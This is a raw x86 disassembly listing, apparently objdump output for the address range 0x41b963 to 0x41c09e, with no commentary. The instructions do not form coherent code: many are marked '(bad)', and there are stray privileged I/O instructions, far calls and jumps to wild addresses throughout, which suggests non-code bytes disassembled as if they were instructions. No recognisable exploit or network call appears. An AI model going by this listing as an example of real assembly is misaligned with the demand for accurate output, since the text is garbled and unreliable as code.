  41b963:	mov    esp,0xab08daf1
  41b968:	mov    cl,0xff
  41b96a:	xchg   ebx,eax
  41b96b:	fiadd  DWORD PTR [esi-0x164dd380]
  41b971:	pop    ebx
  41b972:	pusha  
  41b973:	fstp   QWORD PTR ds:0xb46c1873
  41b979:	fs cmp ch,al
  41b97c:	shl    BYTE PTR [edi+0x59],0x1
  41b980:	ret    
  41b981:	jmp    0x28a1a948
  41b986:	and    eax,0xa8e25937
  41b98b:	lods   al,BYTE PTR ds:[esi]
  41b98c:	sub    dh,BYTE PTR ds:[ecx+0x51]
  41b990:	mov    bl,0x54
  41b992:	in     eax,dx
  41b993:	jp     0x41b9c7
  41b995:	pusha  
  41b996:	cmp    bh,BYTE PTR [ecx+0x240d33fd]
  41b99c:	mov    bl,0xe9
  41b99e:	and    dl,BYTE PTR [ecx+eiz*4+0x4c3e916b]
  41b9a5:	test   BYTE PTR [esi-0x6cb68e7f],cl
  41b9ab:	dec    ecx
  41b9ac:	xor    DWORD PTR [esi-0x61],edi
  41b9af:	mov    al,0xf8
  41b9b1:	mov    eax,0xd0c202f9
  41b9b6:	sbb    BYTE PTR [edi+ebp*8+0x115247de],al
  41b9bd:	jne    0x41b97a
  41b9bf:	mov    edi,0x248c4822
  41b9c4:	cmp    eax,0xe69ad193
  41b9c9:	jmp    0x8a4c43a0
  41b9ce:	cmp    edx,edi
  41b9d0:	adc    DWORD PTR ds:0x22290be1,0xf23b37bd
  41b9da:	outs   dx,DWORD PTR ds:[esi]
  41b9db:	mov    ss,edx
  41b9dd:	outs   dx,DWORD PTR ds:[esi]
  41b9de:	dec    esi
  41b9df:	inc    esi
  41b9e0:	jno    0x41ba5f
  41b9e2:	inc    eax
  41b9e3:	repnz fisttp QWORD PTR [ebp*2+0x59f21e7]
  41b9eb:	push   ebx
  41b9ec:	or     ebp,ecx
  41b9ee:	das    
  41b9ef:	jl     0x41b980
  41b9f1:	shr    DWORD PTR [esp+0x57a6163e],0xf1
  41b9f9:	rcl    DWORD PTR [eax+eiz*2-0x44],cl
  41b9fd:	and    edi,DWORD PTR [edi]
  41b9ff:	call   0x2850ae43
  41ba04:	int    0xbd
  41ba06:	jae    0x41b9a0
  41ba08:	aam    0x80
  41ba0a:	sbb    eax,0xfffffffc
  41ba0d:	add    al,0x1a
  41ba0f:	add    al,0xb8
  41ba11:	jg     0x41b99d
  41ba13:	sahf   
  41ba14:	cld    
  41ba15:	pop    esp
  41ba16:	and    DWORD PTR [ecx+0x47],esp
  41ba19:	push   edi
  41ba1a:	xchg   BYTE PTR [ebp-0x58],bh
  41ba1d:	rcl    BYTE PTR [ecx-0x3d040036],0xd
  41ba24:	inc    ebp
  41ba25:	test   eax,0x491e898b
  41ba2a:	in     al,0xe1
  41ba2c:	loope  0x41b9fc
  41ba2e:	dec    edx
  41ba2f:	inc    esp
  41ba30:	ins    BYTE PTR es:[edi],dx
  41ba31:	sahf   
  41ba32:	pop    edx
  41ba33:	rol    bh,cl
  41ba35:	pop    esp
  41ba36:	cmp    eax,0x1575ab7e
  41ba3b:	out    dx,eax
  41ba3c:	das    
  41ba3d:	xchg   BYTE PTR [edi],al
  41ba3f:	push   ebp
  41ba40:	mov    ah,0x53
  41ba42:	(bad)  
  41ba43:	test   edx,0x5ac4167
  41ba49:	stc    
  41ba4a:	jcxz   0x41ba37
  41ba4d:	jg     0x41ba81
  41ba4f:	ss or  al,0xd3
  41ba52:	dec    edi
  41ba53:	add    bh,BYTE PTR [edx+0x7]
  41ba56:	dec    eax
  41ba57:	push   ecx
  41ba58:	addr16 jle 0x41ba88
  41ba5b:	imul   esi,DWORD PTR [ebp+0x58],0x38969859
  41ba62:	popa   
  41ba63:	in     al,0x9d
  41ba65:	je     0x41ba8d
  41ba67:	inc    ecx
  41ba68:	add    DWORD PTR [edi-0x55c39623],esp
  41ba6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ba6f:	push   ebx
  41ba70:	adc    al,0x65
  41ba72:	and    al,0x16
  41ba74:	repnz push edx
  41ba76:	clc    
  41ba77:	aad    0xc1
  41ba79:	nop
  41ba7a:	outs   dx,BYTE PTR ds:[esi]
  41ba7b:	sbb    ebx,DWORD PTR [eax-0x88c546a]
  41ba81:	push   es
  41ba82:	jg     0x41ba21
  41ba84:	cmp    ch,BYTE PTR [edx+edi*1]
  41ba87:	add    eax,0xa664ae3f
  41ba8c:	mov    DWORD PTR [eax+0x35],esp
  41ba8f:	addr16 cs xchg edi,eax
  41ba92:	or     bl,dl
  41ba94:	push   eax
  41ba95:	xchg   edi,eax
  41ba96:	xchg   esp,eax
  41ba97:	popf   
  41ba98:	inc    esi
  41ba99:	xchg   BYTE PTR [esi-0x37d6f8f1],ah
  41ba9f:	ja     0x41ba7b
  41baa1:	in     al,0x64
  41baa3:	(bad)  
  41baa5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41baa6:	icebp  
  41baa7:	or     DWORD PTR cs:[ebx+0x7bd1f157],0x19
  41baaf:	pusha  
  41bab0:	xchg   ecx,eax
  41bab1:	mov    eax,0xacf2d3e9
  41bab6:	aam    0x32
  41bab8:	ror    BYTE PTR [esi+0x3f66ae96],1
  41babe:	lods   al,BYTE PTR ds:[esi]
  41babf:	call   0xcb47:0x1990c81b
  41bac6:	jmp    0x139cc053
  41bacb:	pop    ss
  41bacc:	retf   0x4ce2
  41bacf:	add    DWORD PTR [ebp+0x60],0x8eb75749
  41bad6:	jns    0x41bae2
  41bad8:	scas   eax,DWORD PTR es:[edi]
  41bad9:	or     ebp,DWORD PTR [edx+edx*4+0x2d]
  41badd:	pop    edx
  41bade:	(bad)  
  41badf:	stos   DWORD PTR es:[edi],eax
  41bae0:	lea    edi,[si+0x5965]
  41bae5:	pop    ss
  41bae6:	mov    ch,0xed
  41bae8:	scas   al,BYTE PTR es:[edi]
  41bae9:	fcom   QWORD PTR [ebx-0x1c8b3773]
  41baef:	push   cs
  41baf0:	or     eax,DWORD PTR [eax+0x57]
  41baf3:	test   BYTE PTR [ebp-0x3c],0x81
  41baf7:	shl    BYTE PTR [ebx+ebp*8+0x16],1
  41bafb:	fadd   QWORD PTR [ebp-0x7f3d1e6f]
  41bb01:	sbb    cl,BYTE PTR [edi-0x3c]
  41bb04:	dec    esi
  41bb05:	ins    DWORD PTR es:[edi],dx
  41bb06:	xor    BYTE PTR [eax+0x5fe495bb],bh
  41bb0c:	xchg   edx,eax
  41bb0d:	aam    0x9a
  41bb0f:	ret    0x207b
  41bb12:	jae    0x41bb59
  41bb14:	xchg   ebx,eax
  41bb15:	ja     0x41bb6e
  41bb17:	mov    ebx,0x7f80e829
  41bb1c:	sub    BYTE PTR [ebp-0x4028286a],dh
  41bb22:	(bad)  
  41bb23:	fcomp  QWORD PTR [edi+0x7b]
  41bb26:	dec    edi
  41bb27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bb28:	out    dx,eax
  41bb29:	sub    ebx,DWORD PTR [edx+0x67]
  41bb2c:	mov    esp,ebx
  41bb2e:	test   DWORD PTR [esi-0x3aa0a72a],0xf9dd1f1a
  41bb38:	cmp    edi,esi
  41bb3a:	iret   
  41bb3b:	push   eax
  41bb3c:	mov    WORD PTR [esi+0x75],cs
  41bb3f:	gs xchg esi,eax
  41bb41:	jno    0x41bb8a
  41bb43:	inc    edx
  41bb44:	add    bh,BYTE PTR [eax+esi*8+0xe]
  41bb48:	jno    0x41bb08
  41bb4a:	mov    ds:0x192cc63,al
  41bb4f:	sbb    bl,ah
  41bb51:	adc    al,0x70
  41bb53:	jbe    0x41bb00
  41bb55:	sub    BYTE PTR [esi+0x23],cl
  41bb58:	repnz lods al,BYTE PTR ds:[esi]
  41bb5a:	cdq    
  41bb5b:	xor    eax,esi
  41bb5d:	jne    0x41bb36
  41bb5f:	aas    
  41bb60:	sbb    DWORD PTR [ebx-0x39602b17],ebx
  41bb66:	dec    ebp
  41bb67:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bb69:	scas   al,BYTE PTR es:[edi]
  41bb6a:	mov    al,ds:0xfc50edaa
  41bb6f:	scas   eax,DWORD PTR es:[edi]
  41bb70:	dec    esp
  41bb71:	sbb    bh,ch
  41bb73:	xchg   edi,eax
  41bb74:	pop    ss
  41bb75:	sbb    al,0x93
  41bb77:	lods   eax,DWORD PTR ds:[esi]
  41bb78:	sbb    al,0x2f
  41bb7a:	jnp    0x41bb4b
  41bb7c:	hlt    
  41bb7d:	addr16 in eax,0xd8
  41bb80:	cmp    ch,ah
  41bb82:	cs sub eax,0x255940f4
  41bb88:	mov    gs,edi
  41bb8a:	dec    eax
  41bb8c:	jno    0x41bbab
  41bb8e:	pop    ds
  41bb8f:	mov    eax,ds:0xa62d72e
  41bb94:	xchg   esp,eax
  41bb95:	xchg   ebp,eax
  41bb96:	call   DWORD PTR ds:0xa6e57711
  41bb9c:	test   al,0xe3
  41bb9e:	in     al,0xd
  41bba0:	pop    ecx
  41bba1:	retf   
  41bba2:	mov    ah,0x3c
  41bba4:	(bad)  
  41bba5:	lods   al,BYTE PTR ds:[esi]
  41bba6:	sub    al,0x99
  41bba8:	mov    cs,WORD PTR [ecx-0x6c]
  41bbab:	xchg   ecx,eax
  41bbac:	pop    edx
  41bbad:	fwait
  41bbae:	js     0x41bb3b
  41bbb0:	adc    BYTE PTR [eax-0x3bda6f14],dh
  41bbb6:	push   es
  41bbb7:	dec    DWORD PTR [eax-0x13]
  41bbba:	lock mov ds:0xfc9b9f0d,eax
  41bbc0:	push   es
  41bbc1:	cli    
  41bbc2:	xchg   esi,eax
  41bbc3:	inc    edx
  41bbc4:	adc    DWORD PTR [esi-0x4e],0xffffff97
  41bbc8:	pop    ss
  41bbc9:	test   ecx,0xf1e1e821
  41bbcf:	cmp    esp,eax
  41bbd1:	sbb    DWORD PTR [esi+0x41b38547],0x3c
  41bbd8:	adc    BYTE PTR [edi-0x2aaa44ba],bh
  41bbde:	(bad)  
  41bbe0:	pop    edi
  41bbe1:	cdq    
  41bbe2:	jg     0x41bc1a
  41bbe4:	idiv   BYTE PTR [ebx]
  41bbe6:	push   ds
  41bbe7:	jecxz  0x41bbd0
  41bbe9:	and    BYTE PTR [edx],cl
  41bbeb:	rcr    DWORD PTR [edi],0x50
  41bbee:	lock int 0xab
  41bbf1:	push   ebp
  41bbf2:	clc    
  41bbf3:	pop    edi
  41bbf4:	sbb    dh,0xbb
  41bbf7:	dec    edx
  41bbf8:	sbb    DWORD PTR [esi],ebp
  41bbfa:	push   ds
  41bbfb:	xlat   BYTE PTR ds:[ebx]
  41bbfc:	fidivr WORD PTR [ebx]
  41bbfe:	jns    0x41bb90
  41bc00:	(bad)  
  41bc01:	push   ebx
  41bc02:	les    edx,FWORD PTR [edi]
  41bc04:	pusha  
  41bc05:	leave  
  41bc06:	add    esp,DWORD PTR [esi-0x5]
  41bc09:	dec    edx
  41bc0a:	jo     0x41bc4e
  41bc0c:	in     al,dx
  41bc0d:	add    bh,BYTE PTR [esi+0xe]
  41bc10:	dec    ebx
  41bc11:	ror    BYTE PTR [eax],0xb9
  41bc14:	fs int 0xac
  41bc17:	mov    ecx,0xc5b775ac
  41bc1c:	mov    ecx,0x7b4bd95f
  41bc21:	shr    BYTE PTR [ebp-0x37],1
  41bc24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc25:	or     ebx,DWORD PTR [eax+ebx*2-0xdd03b98]
  41bc2c:	jns    0x41bc0c
  41bc2e:	or     edi,DWORD PTR [edi-0x73]
  41bc31:	fistp  QWORD PTR [ebp+0x3ec9ae2]
  41bc37:	test   al,0xe7
  41bc39:	daa    
  41bc3a:	pusha  
  41bc3b:	(bad)  
  41bc3c:	mov    ds:0x487cbc90,al
  41bc41:	jmp    0x41bbfd
  41bc43:	mov    ch,0x54
  41bc45:	inc    ebx
  41bc46:	xchg   edx,eax
  41bc47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bc48:	fild   WORD PTR [esi+edx*4+0x19ec5962]
  41bc4f:	cwde   
  41bc50:	adc    ebp,edx
  41bc52:	ret    0x371e
  41bc55:	mov    BYTE PTR [eax],ch
  41bc57:	aad    0xfa
  41bc59:	cld    
  41bc5a:	in     al,dx
  41bc5b:	mov    edx,0x824230d4
  41bc60:	and    ch,BYTE PTR [eax+0x59c62f84]
  41bc66:	or     eax,0x845e7113
  41bc6b:	bound  ebp,QWORD PTR [ebx+0x3a]
  41bc6e:	and    bl,BYTE PTR cs:[edi-0x7a]
  41bc72:	dec    esp
  41bc73:	repz or BYTE PTR [esi-0x4acd5cb],dl
  41bc7a:	jbe    0x41bcc5
  41bc7c:	cmp    DWORD PTR [edi+0x1a7edff3],edi
  41bc82:	fisttp DWORD PTR [edi+0x46]
  41bc85:	jne    0x41bc51
  41bc87:	(bad)  
  41bc89:	arpl   WORD PTR [edi+0x7cce3bbc],bp
  41bc8f:	xchg   ebx,eax
  41bc90:	push   esi
  41bc91:	sub    al,0xa
  41bc93:	jp     0x41bce1
  41bc95:	push   ds
  41bc96:	jb     0x41bc21
  41bc98:	or     DWORD PTR [eax],0x5c
  41bc9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc9c:	int3   
  41bc9d:	ss js  0x41bcd0
  41bca0:	imul   ebx,DWORD PTR [edx+eiz*2-0x763f98c8],0xb4b304f4
  41bcab:	aam    0x17
  41bcad:	ins    BYTE PTR es:[edi],dx
  41bcae:	jae    0x41bcfe
  41bcb0:	data16 mov dl,0x44
  41bcb3:	cwde   
  41bcb4:	ror    DWORD PTR [eax+0x3db115de],0xe3
  41bcbb:	and    BYTE PTR [ebx+esi*2-0x47468663],dl
  41bcc2:	and    al,BYTE PTR [edi+0x7f7720c2]
  41bcc8:	or     eax,0xd6e5c95
  41bccd:	pop    ss
  41bcce:	shr    ch,cl
  41bcd0:	xor    eax,ecx
  41bcd2:	inc    esi
  41bcd3:	mov    ch,0x98
  41bcd5:	dec    edi
  41bcd6:	stos   BYTE PTR es:[edi],al
  41bcd7:	out    0xac,al
  41bcd9:	cmc    
  41bcda:	cli    
  41bcdb:	and    DWORD PTR [esi-0x4c],esp
  41bcde:	xchg   ebp,eax
  41bcdf:	out    0xdb,eax
  41bce1:	ds dec edx
  41bce3:	(bad)
  41bce6:	mov    edi,0x4aac4372
  41bceb:	xor    edx,edx
  41bced:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bcee:	daa    
  41bcef:	jmp    0x41bd54
  41bcf1:	in     eax,dx
  41bcf2:	or     dl,BYTE PTR [bp+di]
  41bcf5:	xor    al,0x66
  41bcf7:	dec    sp
  41bcf9:	outs   dx,BYTE PTR ds:[esi]
  41bcfa:	jno    0x41bd68
  41bcfc:	sub    BYTE PTR [eax],cl
  41bcfe:	add    bl,BYTE PTR [ecx+0x137ec5ac]
  41bd04:	ins    DWORD PTR es:[edi],dx
  41bd05:	jp     0x41bc97
  41bd07:	xor    DWORD PTR [eax-0x76e7b125],eax
  41bd0d:	(bad)  
  41bd0e:	jbe    0x41bd54
  41bd10:	scas   eax,DWORD PTR es:[edi]
  41bd11:	test   al,0xa7
  41bd13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bd14:	inc    edi
  41bd15:	pop    ss
  41bd16:	adc    al,0xfb
  41bd18:	cmp    edi,DWORD PTR [esi]
  41bd1a:	loopne 0x41bd9b
  41bd1c:	cld    
  41bd1d:	test   DWORD PTR [edi],ebx
  41bd1f:	lahf   
  41bd20:	xchg   esi,esi
  41bd22:	cs leave 
  41bd24:	mov    cl,0x68
  41bd26:	loopne 0x41bd01
  41bd28:	int3   
  41bd29:	(bad)  
  41bd2a:	mov    gs,WORD PTR [ebp-0x37]
  41bd2d:	jnp    0x41bd69
  41bd2f:	push   edi
  41bd30:	dec    ebx
  41bd31:	fisubr WORD PTR [edi]
  41bd33:	adc    al,0x39
  41bd35:	stos   BYTE PTR es:[edi],al
  41bd36:	cmc    
  41bd37:	lock inc ebx
  41bd39:	adc    cl,al
  41bd3b:	jge    0x41bd77
  41bd3d:	jmp    DWORD PTR [esi]
  41bd3f:	cmp    edi,DWORD PTR [ecx+0x682b75bb]
  41bd45:	cmp    DWORD PTR [ebx],0x553e973e
  41bd4b:	xchg   edx,eax
  41bd4c:	ret    
  41bd4d:	xchg   ebp,eax
  41bd4e:	pushf  
  41bd4f:	xchg   edx,eax
  41bd50:	pop    esp
  41bd51:	cmc    
  41bd52:	xor    DWORD PTR [eax+0xa988531],edx
  41bd58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd59:	sub    BYTE PTR [edi-0x239f3ae0],bh
  41bd5f:	sub    DWORD PTR gs:[esi],esp
  41bd62:	mov    al,0x3
  41bd64:	dec    ebp
  41bd65:	pop    edx
  41bd66:	push   ebx
  41bd67:	aam    0x9b
  41bd69:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bd6b:	add    DWORD PTR [esp+esi*8-0x29c13478],eax
  41bd72:	push   esp
  41bd73:	sti    
  41bd74:	fcom   QWORD PTR [ebp-0x6a2d9ff]
  41bd7a:	rol    al,cl
  41bd7c:	mov    ds:0xb433092a,eax
  41bd81:	cmc    
  41bd82:	outs   dx,DWORD PTR ds:[esi]
  41bd83:	int3   
  41bd84:	std    
  41bd85:	mov    ?,WORD PTR [ebp-0x657258e1]
  41bd8b:	popa   
  41bd8c:	mov    DWORD PTR [esi+0x23dc9ffd],ebp
  41bd92:	mov    ebp,0x76616f0f
  41bd97:	push   cs
  41bd98:	outs   dx,DWORD PTR ds:[esi]
  41bd99:	add    BYTE PTR [ebp-0x4a3b6b39],ch
  41bd9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bda0:	nop
  41bda1:	sbb    al,0x96
  41bda3:	fwait
  41bda4:	sbb    al,0xce
  41bda6:	ficomp DWORD PTR [ebx]
  41bda8:	shr    DWORD PTR [edx-0x3f],0xef
  41bdac:	out    dx,eax
  41bdad:	mov    ebx,0xdc61665b
  41bdb2:	and    DWORD PTR [ebx-0x7c],edi
  41bdb5:	imul   ecx,eax,0xffffffa8
  41bdb8:	lahf   
  41bdb9:	scas   eax,DWORD PTR es:[edi]
  41bdba:	sub    eax,0xb951e49f
  41bdbf:	sbb    bh,BYTE PTR [edi-0x4a]
  41bdc2:	retf   
  41bdc3:	push   esp
  41bdc4:	inc    ecx
  41bdc5:	mov    ebp,0xc91a68e7
  41bdca:	and    al,0x83
  41bdcc:	sub    DWORD PTR [eax-0x77],0xffffffa3
  41bdd0:	int3   
  41bdd1:	rcl    DWORD PTR [ecx],cl
  41bdd3:	loope  0x41bdfa
  41bdd5:	fmul   DWORD PTR [esp+edx*8]
  41bdd8:	mov    dl,0x85
  41bdda:	inc    esp
  41bddb:	sbb    ebx,edi
  41bddd:	mov    ds:0xb77dd34,al
  41bde2:	push   esi
  41bde3:	jl     0x41be51
  41bde5:	xchg   ebp,eax
  41bde6:	lods   al,BYTE PTR ds:[esi]
  41bde7:	test   dh,ch
  41bde9:	test   DWORD PTR [ebx-0x47],ebx
  41bdec:	dec    ecx
  41bded:	jge    0x41bd79
  41bdef:	push   esp
  41bdf0:	clc    
  41bdf1:	cmp    eax,0xcbfe707a
  41bdf6:	cmc    
  41bdf7:	enter  0xb416,0x67
  41bdfb:	popa   
  41bdfc:	add    al,dh
  41bdfe:	es dec edi
  41be00:	sbb    BYTE PTR [eiz*2-0x77440e58],cl
  41be07:	loopne 0x41be28
  41be09:	js     0x41bdda
  41be0b:	pop    esi
  41be0c:	xor    cl,BYTE PTR [ecx+0x3f]
  41be0f:	pop    es
  41be10:	xchg   ebx,eax
  41be11:	mov    ds:0x32199d35,eax
  41be16:	sbb    esp,eax
  41be18:	inc    edi
  41be19:	imul   eax,esi,0xffffffde
  41be1c:	out    dx,al
  41be1d:	sub    BYTE PTR [ebp+0x13],dl
  41be20:	arpl   ax,bp
  41be22:	inc    esp
  41be23:	loope  0x41be76
  41be25:	lock mov al,ds:0x843d0107
  41be2b:	lahf   
  41be2c:	add    DWORD PTR [eax],0x4a741367
  41be32:	mov    ch,0x67
  41be34:	stos   DWORD PTR es:[edi],eax
  41be35:	add    al,BYTE PTR [esi+ebp*1+0x155a1fcc]
  41be3c:	icebp  
  41be3d:	ss add eax,0x1fb7b4b0
  41be43:	sbb    DWORD PTR [ecx],0xe0bfe6ee
  41be49:	arpl   cx,cx
  41be4b:	dec    esi
  41be4c:	push   es
  41be4d:	in     eax,0x7c
  41be4f:	jne    0x41bdfc
  41be51:	movlhps xmm4,xmm0
  41be54:	gs mov cl,0xfd
  41be57:	mov    dh,0x24
  41be59:	push   ebx
  41be5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be5b:	sbb    ecx,DWORD PTR [edi+ebx*1]
  41be5e:	jmp    0x90968799
  41be63:	xchg   BYTE PTR [ebx-0x7d],bh
  41be66:	in     al,0xfe
  41be68:	cwde   
  41be69:	std    
  41be6a:	adc    al,0x3
  41be6c:	jae    0x41bebb
  41be6e:	fimul  DWORD PTR [esi+0x6]
  41be71:	call   0xf898:0xa2f7e1b9
  41be78:	push   esp
  41be79:	jmp    0x41be1f
  41be7b:	je     0x41bedd
  41be7d:	xchg   DWORD PTR [edi+edi*8+0x14],edi
  41be81:	outs   dx,BYTE PTR ds:[esi]
  41be82:	sub    DWORD PTR [edx+0x29],edi
  41be85:	pusha  
  41be86:	retf   0xd8c1
  41be89:	pop    ecx
  41be8a:	adc    eax,DWORD PTR [ebx]
  41be8c:	or     eax,0x2eebba61
  41be91:	xchg   ebx,eax
  41be92:	cmp    al,0x34
  41be94:	push   esp
  41be95:	add    eax,0xf64fb039
  41be9a:	xor    DWORD PTR [edx],ecx
  41be9c:	and    ebx,DWORD PTR [eax+0x50]
  41be9f:	adc    DWORD PTR [edx+0x6c],ecx
  41bea2:	dec    ecx
  41bea3:	rcl    dl,1
  41bea5:	fcom   DWORD PTR [edi+0x2ed68d02]
  41beab:	cwde   
  41beac:	adc    DWORD PTR [ecx],edi
  41beae:	cmp    dh,BYTE PTR [esi+edx*2-0x61abfa50]
  41beb5:	mov    dl,0x1a
  41beb7:	mov    dl,0xac
  41beb9:	repz xchg ebx,eax
  41bebb:	mov    dh,0x84
  41bebd:	add    edi,DWORD PTR [edi+0x56]
  41bec0:	and    BYTE PTR fs:[edi+eiz*8-0x57],bh
  41bec5:	or     ch,BYTE PTR [ebx-0x633262ff]
  41becb:	stos   BYTE PTR es:[edi],al
  41becc:	ins    BYTE PTR es:[edi],dx
  41becd:	jecxz  0x41befe
  41becf:	and    dh,bh
  41bed1:	sbb    bl,dl
  41bed3:	push   0x29
  41bed5:	mov    eax,ds:0x508020ab
  41beda:	mov    DWORD PTR [ecx],esi
  41bedc:	pop    edi
  41bedd:	mov    al,0x69
  41bedf:	ds sti 
  41bee1:	mov    ds:0x5c361e44,eax
  41bee6:	pop    ebx
  41bee7:	xlat   BYTE PTR ds:[ebx]
  41bee8:	and    bh,bh
  41beea:	fimul  WORD PTR [esi+eiz*1]
  41beed:	push   0xf4f1027c
  41bef2:	daa    
  41bef3:	clc    
  41bef4:	sahf   
  41bef5:	and    DWORD PTR [edx],esp
  41bef7:	outs   dx,DWORD PTR ds:[esi]
  41bef8:	jl     0x41bf2b
  41befa:	cmp    eax,0x21cf8a1c
  41beff:	stc    
  41bf00:	sbb    DWORD PTR [edi+0x15],esp
  41bf03:	push   edi
  41bf04:	mov    ss,WORD PTR [esi-0x2e]
  41bf07:	pop    esi
  41bf08:	or     DWORD PTR [edi],eax
  41bf0a:	pop    ds
  41bf0b:	ds repz gs push eax
  41bf0f:	(bad)
  41bf12:	sub    edi,DWORD PTR [ecx+0x44]
  41bf15:	jae    0x41bf1f
  41bf17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf18:	cmp    esp,DWORD PTR [ebx-0x5cb83cf4]
  41bf1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf1f:	loopne 0x41bf21
  41bf21:	xchg   ebp,eax
  41bf22:	out    dx,al
  41bf23:	icebp  
  41bf24:	outs   dx,BYTE PTR ds:[esi]
  41bf25:	icebp  
  41bf26:	bound  esi,QWORD PTR [esp+ebx*1]
  41bf29:	xchg   ebx,eax
  41bf2a:	cmp    esp,DWORD PTR [eax-0x13]
  41bf2d:	sub    eax,0x15d282bc
  41bf32:	dec    ebx
  41bf33:	xor    ah,BYTE PTR [esi]
  41bf35:	and    eax,0x482cb744
  41bf3a:	add    al,0xf6
  41bf3c:	test   al,0x24
  41bf3e:	and    DWORD PTR [esi],0xffffffe5
  41bf41:	pmuludq mm0,QWORD PTR [ebx-0x18]
  41bf45:	or     edi,ecx
  41bf47:	stc    
  41bf48:	xchg   DWORD PTR [edx+0x35],edi
  41bf4b:	mov    esp,0x8f5dea76
  41bf50:	not    BYTE PTR [ecx+0x6c]
  41bf53:	or     BYTE PTR [ebx+ebx*1+0x7aa7e1ee],ch
  41bf5a:	bound  ecx,QWORD PTR ds:0xfa24c1d7
  41bf60:	retf   0x4617
  41bf63:	push   ebx
  41bf64:	jle    0x41bf2a
  41bf66:	test   eax,0x9ca7a248
  41bf6b:	dec    ebx
  41bf6c:	xchg   ecx,eax
  41bf6d:	fdiv   st,st(1)
  41bf6f:	mov    dl,0x28
  41bf71:	icebp  
  41bf72:	mov    cl,0xe4
  41bf74:	mov    eax,0x1967b99f
  41bf79:	or     esi,DWORD PTR [esi-0x4bf66a04]
  41bf7f:	sub    al,0xa9
  41bf81:	arpl   bp,ax
  41bf83:	mov    ebp,0xec0b4b70
  41bf88:	cmp    eax,0xbcd63769
  41bf8d:	push   0xffffffce
  41bf8f:	hlt    
  41bf90:	sbb    ecx,ecx
  41bf92:	fcomp  QWORD PTR [edx]
  41bf94:	mov    al,ds:0x8b0a551f
  41bf99:	push   ecx
  41bf9a:	dec    edi
  41bf9b:	(bad)  
  41bf9c:	adc    ebp,DWORD PTR [edx+0x4f781284]
  41bfa2:	int3   
  41bfa3:	xor    eax,0xb4f910c7
  41bfa8:	out    0x66,eax
  41bfaa:	(bad)  
  41bfab:	adc    ebp,DWORD PTR [edx]
  41bfad:	loope  0x41c009
  41bfaf:	add    al,0x8f
  41bfb1:	xor    ch,BYTE PTR [ecx+0x42]
  41bfb4:	or     DWORD PTR [edi+0x18],edx
  41bfb7:	std    
  41bfb8:	nop
  41bfb9:	sbb    al,0xce
  41bfbb:	imul   ecx,DWORD PTR [esi],0xa7434c7
  41bfc1:	jmp    0x41c03c
  41bfc3:	stc    
  41bfc4:	repz leave 
  41bfc6:	add    DWORD PTR [edx+0x11aed54c],eax
  41bfcc:	dec    ebp
  41bfcd:	loop   0x41c01b
  41bfcf:	mov    al,0xe1
  41bfd1:	hlt    
  41bfd2:	ja     0x41c02e
  41bfd4:	dec    esp
  41bfd5:	in     al,dx
  41bfd6:	push   ebp
  41bfd7:	shl    BYTE PTR [edx+0x7f0fc31],1
  41bfdd:	dec    eax
  41bfde:	das    
  41bfdf:	sbb    eax,0xa10b07f7
  41bfe4:	jp     0x41bfcb
  41bfe6:	sbb    DWORD PTR [esi+0x51],esi
  41bfe9:	mov    edi,0x9b369a30
  41bfee:	(bad)  
  41bfef:	mov    al,bl
  41bff1:	add    al,0xe3
  41bff3:	and    BYTE PTR [ecx-0x5479cf14],0xfc
  41bffa:	mov    ds:0x775613b1,al
  41bfff:	cmp    edx,DWORD PTR [edx+eax*1-0x40c997d4]
  41c006:	loopne 0x41bfce
  41c008:	cmp    dh,BYTE PTR [esi+ecx*4-0x6a0ef0b9]
  41c00f:	in     al,0xe3
  41c011:	push   es
  41c012:	mov    edx,esp
  41c014:	adc    eax,0x97e3458d
  41c019:	add    ebx,0x85bd3eab
  41c01f:	adc    al,0x68
  41c021:	pop    es
  41c022:	push   ss
  41c023:	xor    al,0x8d
  41c025:	call   0x3b41:0x452285dc
  41c02c:	dec    DWORD PTR [ebx]
  41c02e:	cdq    
  41c02f:	sar    edi,cl
  41c031:	mov    BYTE PTR [ecx-0x40ee10c8],bh
  41c037:	mov    ah,0x9c
  41c039:	ret    0xc9ce
  41c03c:	retf   
  41c03d:	inc    esi
  41c03e:	and    edi,DWORD PTR [edi-0x7b752c57]
  41c044:	sti    
  41c045:	mov    bl,0x61
  41c047:	(bad)  
  41c048:	pop    edx
  41c049:	das    
  41c04a:	inc    ebx
  41c04b:	pusha  
  41c04c:	cmp    edi,0xf
  41c04f:	ds dec esi
  41c051:	fwait
  41c052:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c053:	retf   0x4426
  41c056:	cdq    
  41c057:	xchg   edi,ebp
  41c059:	fld    QWORD PTR [ebx+0x3812109f]
  41c05f:	repz add al,0x82
  41c062:	xchg   dh,ch
  41c064:	ror    DWORD PTR [eax-0x74],cl
  41c067:	and    bh,BYTE PTR [ecx]
  41c069:	mov    ds,eax
  41c06b:	mov    ch,0xa3
  41c06d:	inc    edi
  41c06e:	js     0x41c015
  41c070:	jl     0x41c0b7
  41c072:	sub    bh,al
  41c074:	test   eax,0xce20f575
  41c079:	cmp    dl,al
  41c07b:	lods   eax,DWORD PTR ds:[esi]
  41c07c:	and    DWORD PTR [esi],ebp
  41c07e:	mov    es,WORD PTR [edi]
  41c080:	inc    DWORD PTR [ecx+0x367a3732]
  41c086:	fucomp st(2)
  41c088:	aas    
  41c089:	cwde   
  41c08a:	(bad)  
  41c08b:	xor    al,0xc5
  41c08d:	adc    DWORD PTR [eax+0x1a],ecx
  41c090:	xor    eax,0x4953c580
  41c095:	ds adc ah,ah
  41c098:	jmp    0xc51c699b
  41c09d:	in     eax,dx
  41c09e:	out    0xa0,al
